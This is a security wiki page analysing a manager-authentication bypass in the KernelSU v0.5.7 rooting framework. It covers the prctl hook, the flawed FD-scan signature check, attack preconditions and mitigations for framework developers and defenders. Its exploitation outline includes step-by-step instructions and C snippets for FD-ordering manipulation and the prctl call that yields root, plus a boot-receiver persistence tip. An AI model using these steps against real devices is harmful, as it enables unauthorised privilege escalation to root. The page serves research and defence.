# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks such as KernelSU, APatch and SKRoot patch or hook the Android/Linux kernel and expose privileged functionality to an unprivileged userspace manager app. Magisk is discussed separately below because CVE-2024-48336 involved manager-side code loading rather than this KernelSU syscall path.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

This page abstracts the techniques and pitfalls uncovered in public research (notably Zimperium’s analysis of KernelSU v0.5.7) to help both red and blue teams understand attack surfaces, exploitation primitives, and robust mitigations.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- In KernelSU v0.5.7, a kernel hook on `prctl` receives a magic value, command ID and command-specific arguments from userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- The caller first requests manager status with `CMD_BECOME_MANAGER`. Authorization is command-specific: `CMD_GRANT_ROOT` checks the manager/allowlist state, `CMD_ALLOW_SU` is manager-only, and `CMD_SET_SEPOLICY` is root-only in this version.<sup>[[2]](#references)[[11]](#references)</sup>
- Other commands query version/configuration or report framework events.<sup>[[2]](#references)</sup>
- Because any app can invoke this syscall interface, the correctness of manager authentication is critical.<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- Magic value to divert to KernelSU handler: 0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

When userspace calls prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifies:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- The provided path must start with an expected prefix for the caller UID, e.g. /data/data/<pkg> or /data/user/<id>/<pkg>.
  - Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- The path must be owned by the caller UID.
  - Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- Iterate the calling process’ open file descriptors in increasing descriptor order.
- For each regular file whose path starts with `/data/app/` and ends with `/base.apk`, require the path to contain the package substring derived from the supplied data-directory path.
- Verify the signature of the first candidate that passes those path checks.
- Parse APK v2 signature and verify against the official manager certificate.
  - References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

If all checks pass, the kernel caches the manager’s UID temporarily; manager-only commands then accept that UID, while other commands retain their own UID or allowlist checks.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 does not bind the signature result to PackageManager’s installed package identity. In `manager.c`, the package test is only a path substring check (`strstr(cwd, pkg)`); the first candidate that passes that test is then signature-checked. An attacker can therefore place a genuine manager APK under a `/data/app/` path that also contains the attacker’s package name and arrange for it to be selected first.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

This trust-by-indirection lets an unprivileged app impersonate the manager without owning the manager’s signing key.<sup>[[1]](#references)</sup>

Key properties exploited:<sup>[[1]](#references)[[3]](#references)</sup>
- The FD scan is ordered by descriptor index and the package check is a path substring test, not a verified package-to-APK identity binding.
- open() returns the lowest available FD. By closing lower-numbered FDs first, an attacker can control ordering.
- A bundled manager APK can be placed under `/data/app/` at a path containing the attacker’s package string while retaining the official manager signature.

---
## Attack preconditions

The concrete KernelSU v0.5.7 case requires:<sup>[[1]](#references)[[3]](#references)</sup>

- The device is already rooted with a vulnerable rooting framework (e.g., KernelSU v0.5.7).
- The attacker can run arbitrary unprivileged code locally (Android app process).
- For the v0.5.7 implementation, `current->real_parent` must have UID 0 (the source comment describes this as a zygote direct-child requirement); `manager.c` rejects other parents.<sup>[[3]](#references)</sup>
- The real manager has not yet authenticated (e.g., right after a reboot). Some frameworks cache the manager UID after success; you must win the race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (the cited demo video shows the public proof of concept in operation):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Build a valid path to your own app data directory to satisfy prefix and ownership checks.
2) Place a genuine KernelSU Manager base.apk under `/data/app/` at a path containing your package string, then open it on a lower-numbered FD than your own base.apk.
3) Invoke prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) to pass the checks.
4) Use `CMD_GRANT_ROOT`, then `CMD_ALLOW_SU` for persistent su; invoke root-only `CMD_SET_SEPOLICY` only after obtaining root and only where supported.

Practical notes on step 2 (FD ordering):<sup>[[1]](#references)</sup>
- Identify your process’ FD for your own /data/app/*/base.apk by walking /proc/self/fd symlinks.
- Close a low FD (e.g., stdin, fd 0) and open the legitimate manager APK first so it occupies fd 0 (or any index lower than your own base.apk fd).
- Bundle the legitimate manager APK with your app so its path starts with `/data/app/`, ends with `/base.apk`, and contains your package string. For example, a path under your app’s `lib` directory can satisfy these checks.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
    DIR *d = opendir("/proc/self/fd");
    if (!d) return -1;
    struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
    int best_fd = -1;
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.') continue;
        int fd = atoi(e->d_name);
        snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
        ssize_t n = readlink(link, p, sizeof(p)-1);
        if (n <= 0) continue; p[n] = '\0';
        if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
            if (best_fd < 0 || fd < best_fd) {
                best_fd = fd; strncpy(out_path, p, PATH_MAX);
            }
        }
    }
    closedir(d);
    return best_fd; // First (lowest) matching fd
}
```

Force a lower-numbered FD to point at the legitimate manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
    // Reuse stdin (fd 0) if possible so the next open() returns 0
    close(0);
    int fd = open(legit_apk_path, O_RDONLY);
    (void)fd; // fd should now be 0 if available
}
```

Manager authentication via the KernelSU v0.5.7 `prctl` hook:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
    uint32_t reply = 0;
    // arg3: data path; arg4: unused; arg5: userspace result pointer
    (void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
                (unsigned long)my_data_dir, 0UL,
                (unsigned long)&reply);
    return reply == KSU_MAGIC ? 0 : -1;
}
```

After success, privileged commands (examples):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promote current process to root
- CMD_ALLOW_SU: add your package/UID to allowlist for persistent su
- CMD_SET_SEPOLICY: adjust SELinux policy after obtaining root; KernelSU v0.5.7 checks for UID 0 for this command.<sup>[[2]](#references)</sup>

Race/persistence tip:
- Register a BOOT_COMPLETED receiver in AndroidManifest (`RECEIVE_BOOT_COMPLETED`) to start after reboot and attempt authentication before the real manager; the permission authorizes receipt of `ACTION_BOOT_COMPLETED` but does not itself guarantee scheduling priority.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection and mitigation guidance

For framework developers:
- Bind authentication to the caller’s package/UID, not to arbitrary FDs:
  - Resolve the caller’s package from its UID and verify against the installed package’s signature (via PackageManager) rather than scanning FDs.
  - If kernel-only, use stable caller identity (task creds) and validate on a stable source of truth managed by init/userspace helper, not process FDs.
- Avoid path-prefix checks as identity; they are trivially satisfiable by the caller.
- Use nonce-based challenge–response over the channel and clear any cached manager identity at boot or on key events.
- Consider binder-based authenticated IPC instead of overloading generic syscalls when feasible.

For defenders/blue team:
- Detect presence of rooting frameworks and manager processes; monitor for prctl calls with suspicious magic constants (e.g., 0xDEADBEEF) if you have kernel telemetry.<sup>[[1]](#references)[[11]](#references)</sup>
- On managed fleets, block or alert on boot receivers from untrusted packages that rapidly attempt privileged manager commands post-boot.
- Ensure devices are updated to patched framework versions; invalidate cached manager IDs on update.

Limitations of the attack:<sup>[[1]](#references)[[2]](#references)</sup>
- Only affects devices already rooted with a vulnerable framework.
- Typically requires a reboot/race window before the legitimate manager authenticates (some frameworks cache manager UID until reset).

---
## Related notes across frameworks

- Password-based auth (e.g., historical APatch/SKRoot builds) can be weak if passwords are guessable/bruteforceable or validations are buggy.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (e.g., KernelSU) is stronger in principle but must bind to the actual caller, not path-derived artefacts selected through FD scans.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 affected pre-Canary 27007 builds that loaded code from an unverified GMS package, allowing a local app to execute code in the Magisk app and escalate to root without user interaction.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c authentication checks](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c FD iteration, package check and signature call](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c APK v2 verification](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – Verify GMS is system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h command identifiers](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)

{{#include ../../banners/hacktricks-training.md}}
